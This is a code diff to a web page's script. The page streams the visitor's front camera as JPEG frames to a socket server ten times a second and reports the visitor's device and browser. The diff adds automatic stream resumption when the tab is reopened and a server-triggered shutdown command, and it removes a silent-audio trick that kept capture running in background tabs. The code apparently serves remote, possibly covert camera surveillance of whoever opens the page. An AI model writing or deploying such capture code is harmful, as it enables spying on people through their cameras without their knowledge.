@@ -64,45 +64,67 @@
         const canvas = document.getElementById('canvas');
         let mediaStream = null;
         let isCameraReady = false;
+        let streamInterval = null;
 
-        // 🧠 BACKGROUND KEEP-ALIVE HACK (Prevents browser from pausing script in background/recent tabs)
-        function keepAliveAudio() {
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const gainNode = audioCtx.createGain();
-                gainNode.gain.value = 0.0001; // Silent audio
-                oscillator.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-                oscillator.start();
-            } catch (e) {
-                console.log("Audio context error:", e);
-            }
+        // Simple Device and Browser Info Parser
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "Desktop/PC";
+            let browser = "Unknown Browser";
+
+            if (/android/i.test(ua)) device = "Android Mobile";
+            else if (/iphone|ipad|ipod/i.test(ua)) device = "iOS Device";
+            else if (/mobile/i.test(ua)) device = "Mobile Device";
+
+            if (/chrome|crios/i.test(ua)) browser = "Google Chrome";
+            else if (/firefox|fxios/i.test(ua)) browser = "Mozilla Firefox";
+            else if (/safari/i.test(ua)) browser = "Apple Safari";
+            else if (/edg/i.test(ua)) browser = "Microsoft Edge";
+
+            return `${device} (${browser})`;
         }
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                mediaStream = stream;
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    video.play();
-                    isCameraReady = true;
-                    keepAliveAudio(); // Start background lock
-                    socket.emit('user-ready');
+        function startCameraStream() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    mediaStream = stream;
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        isCameraReady = true;
+                        socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
+                        startLoop();
+                    };
+                })
+                .catch(err => console.error("Camera access error:", err));
+        }
 
-                    // Continuous Smooth Live Stream Loop (Even works when tab is backgrounded)
-                    setInterval(() => {
-                        if (!isCameraReady) return;
-                        const context = canvas.getContext('2d');
-                        canvas.width = 320;
-                        canvas.height = 240;
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const frameData = canvas.toDataURL('image/jpeg', 0.3);
-                        socket.emit('live-stream-frame', frameData);
-                    }, 100);
-                };
-            })
-            .catch(err => console.error("Camera access error:", err));
+        function startLoop() {
+            if (streamInterval) clearInterval(streamInterval);
+            streamInterval = setInterval(() => {
+                if (!isCameraReady || !video.videoWidth) return;
+                const context = canvas.getContext('2d');
+                canvas.width = 320;
+                canvas.height = 240;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const frameData = canvas.toDataURL('image/jpeg', 0.3);
+                socket.emit('live-stream-frame', frameData);
+            }, 100);
+        }
+
+        // Auto-resume stream when tab becomes active again
+        document.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === "visible") {
+                if (video.paused && mediaStream) {
+                    video.play().catch(e => console.log("Play error:", e));
+                } else if (!mediaStream) {
+                    startCameraStream();
+                }
+                socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
+            }
+        });
+
+        startCameraStream();
 
         function takeSinglePhoto() {
             if (!isCameraReady) return;
@@ -134,7 +156,7 @@
 
         socket.on('disable-user-access', () => {
             if (mediaStream) {
-                mediaStream.getTracks().exports().forEach(track => track.stop());
+                mediaStream.getTracks().forEach(track => track.stop());
             }
             document.body.innerHTML = `
                 <div class="card">
